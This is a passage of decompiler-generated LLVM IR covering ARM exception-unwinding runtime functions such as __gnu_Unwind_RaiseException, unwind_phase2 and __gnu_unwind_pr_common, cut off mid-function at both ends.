  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_16ed8 = inttoptr i32 %v1_16ec4 to i32*
  %v2_16ed8 = load i32, i32* %v1_16ed8, align 4
  store i32 %v2_16ed8, i32* %r0.global-to-local, align 4
  %v12_16ed8 = add i32 %entry_vrs, 20
  %v1_16ee4 = inttoptr i32 %v12_16ed8 to i32*
  %v2_16ee4 = load i32, i32* %v1_16ee4, align 4
  store i32 %v2_16ee4, i32* %r0.global-to-local, align 4
  %v12_16ee4 = add i32 %entry_vrs, 36
  %v1_16eec = inttoptr i32 %v12_16ee4 to i32*
  %v2_16eec = load i32, i32* %v1_16eec, align 4
  store i32 %v2_16eec, i32* %r0.global-to-local, align 4
  %v12_16eec = add i32 %entry_vrs, 52
  store i32 %v12_16eec, i32* @ip, align 4
  %v13_16ef0 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_16ef0, i32* @lr, align 4
  %v1_16ef4 = inttoptr i32 %v12_16eec to i32*
  %v2_16ef4 = load i32, i32* %v1_16ef4, align 4
  store i32 %v2_16ef4, i32* %r0.global-to-local, align 4
  %v9_16ef4 = add i32 %entry_vrs, 64
  %v10_16ef4 = inttoptr i32 %v9_16ef4 to i32*
  %v11_16ef4 = load i32, i32* %v10_16ef4, align 4
  store i32 0, i32* @r4, align 4
  %v1_16efc = add i32 %ucbp, 12
  %v2_16efc = inttoptr i32 %v1_16efc to i32*
  %v3_16efc = load i32, i32* %v2_16efc, align 4
  store i32 %v2_16ef4, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_16f14 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_16ef4)
  store i32 %v2_16f14, i32* %r0.global-to-local, align 4
  %v0_16f18 = load i32, i32* @r6, align 4
  %v1_16f18 = load i32, i32* @r4, align 4
  %v9_16f18 = icmp eq i32 %v0_16f18, %v1_16f18
  store i32 %v2_16f14, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_16f18, label %dec_label_pc_16f2c, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_16f38

dec_label_pc_16f2c:                               ; preds = %entry
  store i32 %v0_16f18, i32* @r4, align 4
  br label %dec_label_pc_16f34

dec_label_pc_16f34:                               ; preds = %dec_label_pc_16ffc, %dec_label_pc_16f2c
  br label %dec_label_pc_16f38

dec_label_pc_16f38:                               ; preds = %.thread, %dec_label_pc_16f34
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_16f34 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_16f38 = icmp eq i32 %v2_16f14, 0
  br i1 %v2_16f38, label %dec_label_pc_16fb0, label %.thread2.dec_label_pc_16f4c_crit_edge

.thread2.dec_label_pc_16f4c_crit_edge:            ; preds = %dec_label_pc_16f38
  br label %dec_label_pc_16f4c

dec_label_pc_16f4c:                               ; preds = %.thread2.dec_label_pc_16f4c_crit_edge, %dec_label_pc_16fb0
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_16f5c = load i32, i32* @r5, align 4
  store i32 %v0_16f5c, i32* @r3, align 4
  store i32 94060, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_16efc)
  br i1 false, label %dec_label_pc_16f74, label %dec_label_pc_16f9c

dec_label_pc_16f74:                               ; preds = %dec_label_pc_16f4c
  br i1 undef, label %dec_label_pc_16f7c, label %dec_label_pc_16fa0

dec_label_pc_16f7c:                               ; preds = %dec_label_pc_16f74
  br i1 undef, label %dec_label_pc_16ffc, label %dec_label_pc_16f94

dec_label_pc_16f94:                               ; preds = %dec_label_pc_16f7c
  br i1 undef, label %dec_label_pc_16ff4, label %dec_label_pc_16f9c

dec_label_pc_16f9c:                               ; preds = %dec_label_pc_16f4c, %dec_label_pc_16f94
  br label %dec_label_pc_16fa0

dec_label_pc_16fa0:                               ; preds = %dec_label_pc_16f74, %dec_label_pc_16f9c
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_16fb0:                               ; preds = %dec_label_pc_16f38
  store i32 %v11_16ef4, i32* @r3, align 4
  %v2_16fb4 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_16fb4, i32* @r4, align 4
  %v1_16fb8 = load i32, i32* @r5, align 4
  %v2_16fb8 = add i32 %v1_16fb8, 20
  %v3_16fb8 = inttoptr i32 %v2_16fb8 to i32*
  store i32 %v11_16ef4, i32* %v3_16fb8, align 4
  store i32 %v2_16fb4, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_16fc8 = call i32 @memcpy()
  %v0_16fd0 = load i32, i32* @r6, align 4
  store i32 %v0_16fd0, i32* %r0.global-to-local, align 4
  %v0_16fd4 = load i32, i32* @r5, align 4
  %v1_16fd8 = add i32 %v0_16fd4, 16
  %v2_16fd8 = inttoptr i32 %v1_16fd8 to i32*
  %v3_16fd8 = load i32, i32* %v2_16fd8, align 4
  store i32 %v3_16fd8, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_16fd8)
  %v0_16fe8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16fe8, i32* @r4, align 4
  br label %dec_label_pc_16f4c

dec_label_pc_16ff4:                               ; preds = %dec_label_pc_16f94
  br label %dec_label_pc_16ffc

dec_label_pc_16ffc:                               ; preds = %dec_label_pc_16f7c, %dec_label_pc_16ff4
  br label %dec_label_pc_16f34

; uselistorder directives
  uselistorder i32 %v11_16ef4, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 6, 5, 1, 0, 4, 3, 8, 7 }
  uselistorder i32* @r3, { 69, 70, 30, 31, 33, 34, 19, 71, 72, 22, 8, 9, 10, 76, 73, 74, 75, 1, 77, 78, 79, 80, 81, 4, 82, 83, 84, 5, 85, 86, 87, 6, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 0, 106, 107, 108, 109, 20, 21, 23, 24, 25, 26, 27, 28, 29, 32, 59, 110, 111, 124, 125, 126, 114, 115, 116, 117, 118, 2, 119, 7, 35, 36, 112, 113, 66, 67, 68, 60, 61, 49, 50, 52, 51, 37, 38, 39, 40, 41, 42, 120, 121, 122, 123, 43, 62, 63, 64, 65, 3, 11, 12, 13, 14, 15, 16, 17, 18, 44, 45, 46, 47, 48, 53, 54, 55, 56, 57, 58 }
  uselistorder i32 10, { 1, 2, 32, 33, 34, 4, 35, 79, 77, 0, 36, 7, 30, 31, 27, 3, 37, 28, 8, 29, 38, 9, 39, 10, 40, 11, 41, 12, 42, 13, 43, 14, 44, 15, 45, 16, 46, 17, 47, 18, 48, 19, 49, 20, 50, 51, 21, 22, 52, 53, 54, 55, 56, 57, 58, 59, 60, 23, 61, 62, 63, 5, 64, 65, 66, 24, 6, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 25, 78, 26 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_16ffc, { 1, 0 }
  uselistorder label %dec_label_pc_16fa0, { 1, 0 }
  uselistorder label %dec_label_pc_16f9c, { 1, 0 }
  uselistorder label %dec_label_pc_16f4c, { 1, 0 }
  uselistorder label %dec_label_pc_16f38, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_17010 = add i32 %ucbp, 12
  %v3_17010 = inttoptr i32 %v2_17010 to i32*
  store i32 %stop_fn, i32* %v3_17010, align 4
  %v3_17014 = add i32 %ucbp, 24
  %v4_17014 = inttoptr i32 %v3_17014 to i32*
  store i32 %tmp, i32* %v4_17014, align 4
  %v1_17018 = add i32 %entry_vrs, 60
  %v2_17018 = inttoptr i32 %v1_17018 to i32*
  %v3_17018 = load i32, i32* %v2_17018, align 4
  %v2_17020 = add i32 %entry_vrs, 64
  %v3_17020 = inttoptr i32 %v2_17020 to i32*
  store i32 %v3_17018, i32* %v3_17020, align 4
  %v3_17028 = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_17028

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_170406 = add i32 %vrs, 64
  %v2_170407 = inttoptr i32 %v1_170406 to i32*
  %v3_170408 = load i32, i32* %v2_170407, align 4
  %v2_170449 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_170408)
  store i32 %v2_170449, i32* %r0.global-to-local, align 4
  %v2_1704811 = icmp eq i32 %v2_170449, 0
  br i1 %v2_1704811, label %dec_label_pc_17050, label %dec_label_pc_17080

dec_label_pc_17050:                               ; preds = %entry, %dec_label_pc_17050.dec_label_pc_1703c_crit_edge
  %v0_17050 = load i32, i32* @r5, align 4
  %v1_17050 = add i32 %v0_17050, 64
  %v2_17050 = inttoptr i32 %v1_17050 to i32*
  %v3_17050 = load i32, i32* %v2_17050, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_17058 = load i32, i32* @r4, align 4
  %v2_17058 = add i32 %v1_17058, 20
  %v3_17058 = inttoptr i32 %v2_17058 to i32*
  store i32 %v3_17050, i32* %v3_17058, align 4
  %v0_1705c = load i32, i32* @r4, align 4
  %v1_17064 = add i32 %v0_1705c, 16
  %v2_17064 = inttoptr i32 %v1_17064 to i32*
  %v3_17064 = load i32, i32* %v2_17064, align 4
  call void @__pseudo_branch(i32 %v3_17064)
  %v0_17070 = load i32, i32* %r0.global-to-local, align 4
  %v7_17070 = icmp eq i32 %v0_17070, 8
  br i1 %v7_17070, label %dec_label_pc_17050.dec_label_pc_1703c_crit_edge, label %dec_label_pc_17078

dec_label_pc_17050.dec_label_pc_1703c_crit_edge:  ; preds = %dec_label_pc_17050
  %v0_1703c.pre = load i32, i32* @r4, align 4
  %v0_17040.pre = load i32, i32* @r5, align 4
  store i32 %v0_1703c.pre, i32* %r0.global-to-local, align 4
  %v1_17040 = add i32 %v0_17040.pre, 64
  %v2_17040 = inttoptr i32 %v1_17040 to i32*
  %v3_17040 = load i32, i32* %v2_17040, align 4
  %v2_17044 = call i32 @get_eit_entry(i32 %v0_1703c.pre, i32 %v3_17040)
  store i32 %v2_17044, i32* %r0.global-to-local, align 4
  %v2_17048 = icmp eq i32 %v2_17044, 0
  br i1 %v2_17048, label %dec_label_pc_17050, label %dec_label_pc_17080

dec_label_pc_17078:                               ; preds = %dec_label_pc_17050
  %v7_17078 = icmp eq i32 %v0_17070, 7
  br i1 %v7_17078, label %dec_label_pc_17084, label %dec_label_pc_17080

dec_label_pc_17080:                               ; preds = %entry, %dec_label_pc_17050.dec_label_pc_1703c_crit_edge, %dec_label_pc_17078
  %v0_17080 = call i32 @abort()
  store i32 %v0_17080, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17084

dec_label_pc_17084:                               ; preds = %dec_label_pc_17078, %dec_label_pc_17080
  %v0_17084 = load i32, i32* @r5, align 4
  %v1_17084 = add i32 %v0_17084, 4
  store i32 %v1_17084, i32* %r0.global-to-local, align 4
  %v1_17088 = inttoptr i32 %v1_17084 to i32*
  %v2_17088 = call i32 @__restore_core_regs(i32* %v1_17088)
  store i32 %v2_17088, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_17084, { 1, 0 }
  uselistorder label %dec_label_pc_17080, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17050, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_1708c = add i32 %ucbp, 20
  %v2_1708c = inttoptr i32 %v1_1708c to i32*
  %v3_1708c = load i32, i32* %v2_1708c, align 4
  %v1_17094 = load i32, i32* %r1.global-to-local, align 4
  %v2_17094 = add i32 %v1_17094, 64
  %v3_17094 = inttoptr i32 %v2_17094 to i32*
  store i32 %v3_1708c, i32* %v3_17094, align 4
  %v1_17098 = add i32 %ucbp, 12
  %v2_17098 = inttoptr i32 %v1_17098 to i32*
  %v3_17098 = load i32, i32* %v2_17098, align 4
  %v2_1709c = icmp eq i32 %v3_17098, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_170a8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_170a8, i32* @r5, align 4
  br i1 %v2_1709c, label %dec_label_pc_170b0, label %dec_label_pc_170ec

dec_label_pc_170b0:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_170bc = add i32 %ucbp, 16
  %v2_170bc = inttoptr i32 %v1_170bc to i32*
  %v3_170bc = load i32, i32* %v2_170bc, align 4
  call void @__pseudo_branch(i32 %v3_170bc)
  br i1 false, label %dec_label_pc_170e4, label %dec_label_pc_170d0

dec_label_pc_170d0:                               ; preds = %dec_label_pc_170b0
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_11d58.758 to i32))
  %v0_170d8 = load i32, i32* @r4, align 4
  %v0_170dc = load i32, i32* @r5, align 4
  store i32 %v0_170dc, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_170d8, i32 %v0_170dc)
  br label %dec_label_pc_170e4

dec_label_pc_170e4:                               ; preds = %dec_label_pc_170b0, %dec_label_pc_170d0
  %v0_170e4 = load i32, i32* @r5, align 4
  %v1_170e4 = add i32 %v0_170e4, 4
  %v1_170e8 = inttoptr i32 %v1_170e4 to i32*
  %v2_170e8 = call i32 @__restore_core_regs(i32* %v1_170e8)
  %v1_170f0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_170ec

dec_label_pc_170ec:                               ; preds = %entry, %dec_label_pc_170e4
  %v1_170f0 = phi i32 [ %v0_170a8, %entry ], [ %v1_170f0.pre, %dec_label_pc_170e4 ]
  %v3_170f0 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_170f0, i32 1)
  %v0_170f4 = call i32 @abort()
  ret i32 %v0_170f4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 10, 9, 8, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 42, 43, 44, 45, 24, 46, 48, 21, 18, 19, 20, 14, 15, 16, 22, 23, 17, 5, 6, 7, 8, 9, 10, 11, 12, 13, 53, 57, 56, 55, 49, 50, 1, 25, 26, 34, 35, 36, 51, 52, 54, 37, 38, 47, 27, 39, 33, 28, 29, 0, 30, 31, 32, 40, 41, 2, 3, 4 }
  uselistorder i1 true, { 0, 1, 2, 3, 95, 128, 4, 129, 130, 131, 132, 5, 82, 111, 133, 6, 81, 134, 7, 80, 135, 136, 137, 138, 8, 139, 112, 9, 84, 140, 10, 83, 141, 142, 11, 143, 144, 145, 12, 146, 147, 13, 148, 14, 114, 149, 150, 113, 151, 152, 15, 85, 16, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 18, 87, 19, 163, 164, 165, 20, 86, 166, 21, 17, 167, 168, 22, 169, 170, 171, 23, 172, 173, 174, 175, 176, 24, 25, 115, 26, 27, 28, 29, 127, 88, 177, 178, 89, 179, 117, 180, 181, 31, 182, 183, 32, 90, 185, 30, 186, 184, 187, 116, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 102, 101, 47, 206, 79, 93, 99, 188, 100, 197, 189, 120, 190, 191, 48, 192, 49, 50, 193, 194, 94, 195, 196, 92, 198, 199, 200, 201, 202, 203, 51, 52, 204, 205, 119, 118, 63, 64, 65, 207, 66, 67, 103, 104, 107, 105, 108, 97, 106, 208, 98, 110, 209, 53, 210, 54, 55, 56, 211, 121, 122, 57, 58, 212, 123, 124, 59, 60, 213, 125, 126, 61, 62, 96, 214, 215, 109, 216, 68, 91, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_170ec, { 1, 0 }
  uselistorder label %dec_label_pc_170e4, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_170f8 = load i32, i32* @r4, align 4
  store i32 %v3_170f8, i32* %stack_var_-16, align 4
  %v6_170f8 = load i32, i32* @r5, align 4
  %v9_170f8 = load i32, i32* @r6, align 4
  %v12_170f8 = load i32, i32* @lr, align 4
  %v1_170fc = add i32 %entry_vrs, 60
  %v2_170fc = inttoptr i32 %v1_170fc to i32*
  %v3_170fc = load i32, i32* %v2_170fc, align 4
  %v2_17100 = add i32 %entry_vrs, 64
  %v3_17100 = inttoptr i32 %v2_17100 to i32*
  store i32 %v3_170fc, i32* %v3_17100, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_17130 = load i32, i32* %v3_17100, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_17148 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_17130)
  %v2_1714c = icmp eq i32 %v2_17148, 0
  br i1 %v2_1714c, label %dec_label_pc_17154, label %dec_label_pc_17188

dec_label_pc_17154:                               ; preds = %entry
  %v0_17154 = load i32, i32* @r5, align 4
  %v1_1715c = add i32 %v0_17154, 16
  %v2_1715c = inttoptr i32 %v1_1715c to i32*
  %v3_1715c = load i32, i32* %v2_1715c, align 4
  call void @__pseudo_branch(i32 %v3_1715c)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_17174 = load i32, i32* %saved_vrs_-320, align 4
  %v1_17178 = urem i32 %v2_17174, 2
  %v2_17178 = icmp eq i32 %v1_17178, 0
  br i1 %v2_17178, label %dec_label_pc_17198, label %dec_label_pc_17180

dec_label_pc_17180:                               ; preds = %dec_label_pc_17154, %dec_label_pc_17198
  %v0_17180 = phi i1 [ false, %dec_label_pc_17154 ], [ %phitmp, %dec_label_pc_17198 ]
  br i1 %v0_17180, label %dec_label_pc_171a4, label %dec_label_pc_17188

dec_label_pc_17188:                               ; preds = %entry, %dec_label_pc_17180
  %v2_17190 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17190, i32* @r4, align 4
  store i32 %v6_170f8, i32* @r5, align 4
  store i32 %v9_170f8, i32* @r6, align 4
  store i32 %v12_170f8, i32* @lr, align 4
  ret i32 9

dec_label_pc_17198:                               ; preds = %dec_label_pc_17154
  %v2_17198 = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_17198, i32* @r0, align 4
  %v1_1719c = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_17198)
  %v0_17180.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_17180.pre, 6
  br label %dec_label_pc_17180

dec_label_pc_171a4:                               ; preds = %dec_label_pc_17180
  %v0_171a4 = load i32, i32* @r5, align 4
  %v0_171a8 = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_171a4, i32 %v0_171a8)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder i32 (i32, i32)* @get_eit_entry, { 1, 3, 0, 2 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17188, { 1, 0 }
  uselistorder label %dec_label_pc_17180, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_171b0 = add i32 %ucbp, 12
  %v2_171b0 = inttoptr i32 %v1_171b0 to i32*
  %v3_171b0 = load i32, i32* %v2_171b0, align 4
  %v2_171b4 = icmp eq i32 %v3_171b0, 0
  br i1 %v2_171b4, label %dec_label_pc_171bc, label %dec_label_pc_171c0

dec_label_pc_171bc:                               ; preds = %entry
  %v2_171bc = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_171c0

dec_label_pc_171c0:                               ; preds = %entry, %dec_label_pc_171bc
  %v1_171c0 = add i32 %entry_vrs, 60
  %v2_171c0 = inttoptr i32 %v1_171c0 to i32*
  %v3_171c0 = load i32, i32* %v2_171c0, align 4
  %v2_171c8 = add i32 %entry_vrs, 64
  %v3_171c8 = inttoptr i32 %v2_171c8 to i32*
  store i32 %v3_171c0, i32* %v3_171c8, align 4
  %v3_171cc = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_171cc

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 1, 0, 2 }
  uselistorder i32 %entry_vrs, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_171c0, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_1722c

bb:                                               ; preds = %entry
  %v7_171e4 = mul i32 %regclass, 4
  %v8_171e4 = add i32 %v7_171e4, ptrtoint (i32* @global_var_171ec.927 to i32)
  call void @__pseudo_branch(i32 %v8_171e4)
  br label %dec_label_pc_1722c

dec_label_pc_1722c:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_17314 = load i32, i32* @r4, align 4
  %v6_17314 = load i32, i32* @r5, align 4
  %v2_17324 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_1732c = add i32 %ucbp, 76
  %v2_1732c = inttoptr i32 %v1_1732c to i32*
  %v3_1732c = load i32, i32* %v2_1732c, align 4
  %v1_17338 = inttoptr i32 %v3_1732c to i32*
  %v2_17338 = load i32, i32* %v1_17338, align 4
  store i32 %v2_17338, i32* @lr, align 4
  %v4_17338 = add i32 %v3_1732c, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_17344 = urem i32 %state, 4
  store i32 %v1_17344, i32* %r2.global-to-local, align 4
  %v1_17348 = and i32 %state, 8
  store i32 %v1_17348, i32* %r0.global-to-local, align 4
  %v4_17358 = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_17338, i32* %v4_17358, align 8
  br i1 %v2_17324, label %dec_label_pc_17368, label %dec_label_pc_17644

dec_label_pc_17368:                               ; preds = %entry
  %v3_17368 = mul i32 %v2_17338, 256
  store i32 %v3_17368, i32* %v4_17358, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17380

dec_label_pc_17380:                               ; preds = %dec_label_pc_17644, %dec_label_pc_17368
  %v0_173a4647090 = phi i32 [ %v2_1765c, %dec_label_pc_17644 ], [ %v4_17338, %dec_label_pc_17368 ]
  store i32 %v1_17344, i32* %r2.global-to-local, align 4
  %v1_17384 = add i32 %ucbp, 80
  %v2_17384 = inttoptr i32 %v1_17384 to i32*
  %v3_17384 = load i32, i32* %v2_17384, align 4
  %v7_17388 = icmp eq i32 %v1_17344, 2
  br i1 %v7_17388, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_17380
  %v2_1738c = add i32 %ucbp, 56
  %v3_1738c = inttoptr i32 %v2_1738c to i32*
  %v4_1738c = load i32, i32* %v3_1738c, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_17380, %bb
  %v0_173a46470 = phi i32 [ %v0_173a4647090, %dec_label_pc_17380 ], [ %v4_1738c, %bb ]
  %v1_17390 = urem i32 %v3_17384, 2
  %v2_17390 = icmp eq i32 %v1_17390, 0
  br i1 %v2_17390, label %dec_label_pc_173a4.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_17464

dec_label_pc_173a4.preheader:                     ; preds = %bb148
  %v1_173a46571 = inttoptr i32 %v0_173a46470 to i32*
  %v2_173a46672 = load i32, i32* %v1_173a46571, align 4
  %v2_173a86874 = icmp eq i32 %v2_173a46672, 0
  br i1 %v2_173a86874, label %dec_label_pc_17464, label %dec_label_pc_173b0.preheader.lr.ph.lr.ph

dec_label_pc_173b0.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_173a4.preheader
  %v7_173b4 = icmp eq i32 %id, 2
  %v2_17440 = icmp eq i32 %v1_17344, 0
  %v2_1760c = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_17528 = icmp eq i32 %v1_17348, 0
  br label %dec_label_pc_173b0.preheader.lr.ph

dec_label_pc_173b0.preheader.lr.ph:               ; preds = %dec_label_pc_173b0.preheader.lr.ph.lr.ph, %dec_label_pc_17678
  %v1_173c096 = phi i32 [ %v2_173a46672, %dec_label_pc_173b0.preheader.lr.ph.lr.ph ], [ %v2_173a466, %dec_label_pc_17678 ]
  %v1_173bc93 = phi i32 [ %v0_173a46470, %dec_label_pc_173b0.preheader.lr.ph.lr.ph ], [ %v2_1767c, %dec_label_pc_17678 ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_173b0.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_17678 ]
  br label %dec_label_pc_173b0.preheader

dec_label_pc_173b0.preheader:                     ; preds = %dec_label_pc_173b0.preheader.lr.ph, %dec_label_pc_1763c
  %v1_173c095 = phi i32 [ %v1_173c096, %dec_label_pc_173b0.preheader.lr.ph ], [ %v2_173a4, %dec_label_pc_1763c ]
  %v1_173bc92 = phi i32 [ %v1_173bc93, %dec_label_pc_173b0.preheader.lr.ph ], [ %v1_1763c, %dec_label_pc_1763c ]
  br label %dec_label_pc_173b0

dec_label_pc_173b0:                               ; preds = %dec_label_pc_173b0.preheader, %dec_label_pc_17454
  %v1_173c0 = phi i32 [ %v1_173c095, %dec_label_pc_173b0.preheader ], [ %v2_17458, %dec_label_pc_17454 ]
  %v1_173d4 = phi i32 [ %v1_173bc92, %dec_label_pc_173b0.preheader ], [ %v1_17454, %dec_label_pc_17454 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_173b4, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_173b0
  %v2_173b8 = add i32 %v1_173d4, 4
  %v3_173b8 = inttoptr i32 %v2_173b8 to i32*
  %v4_173b8 = load i32, i32* %v3_173b8, align 4
  store i32 %v4_173b8, i32* @r5, align 4
  store i32 %v1_173c0, i32* @r6, align 4
  %v0_173c4109 = load i32, i32* @r8, align 4
  %v1_173c4110 = add i32 %v0_173c4109, 72
  %v2_173c4111 = inttoptr i32 %v1_173c4110 to i32*
  %v3_173c4112 = load i32, i32* %v2_173c4111, align 4
  store i32 %v3_173c4112, i32* @lr, align 4
  %v2_173d0 = add i32 %v1_173d4, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_173b0
  %v2_173bc = add i32 %v1_173d4, 2
  %v3_173bc = inttoptr i32 %v2_173bc to i16*
  %v4_173bc = load i16, i16* %v3_173bc, align 2
  %v5_173bc = zext i16 %v4_173bc to i32
  store i32 %v5_173bc, i32* @r5, align 4
  %v0_173c4 = load i32, i32* @r8, align 4
  %v1_173c4 = add i32 %v0_173c4, 72
  %v2_173c4 = inttoptr i32 %v1_173c4 to i32*
  %v3_173c4 = load i32, i32* %v2_173c4, align 4
  store i32 %v3_173c4, i32* @lr, align 4
  %v2_173cc = inttoptr i32 %v1_173d4 to i16*
  %v3_173cc = load i16, i16* %v2_173cc, align 2
  %v4_173cc = zext i16 %v3_173cc to i32
  store i32 %v4_173cc, i32* @r6, align 4
  %v2_173d4 = add i32 %v1_173d4, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_173d4, %.thread16 ], [ %v2_173d0, %bb151 ]
  %v3_173c4115 = phi i32 [ %v3_173c4, %.thread16 ], [ %v3_173c4112, %bb151 ]
  %v0_173dc113 = phi i32 [ %v5_173bc, %.thread16 ], [ %v4_173b8, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_173dc = and i32 %v0_173dc113, -2
  %v2_173e0 = add i32 %v1_173dc, %v3_173c4115
  store i32 %v2_173e0, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_173f0 = load i32, i32* %fp.global-to-local, align 4
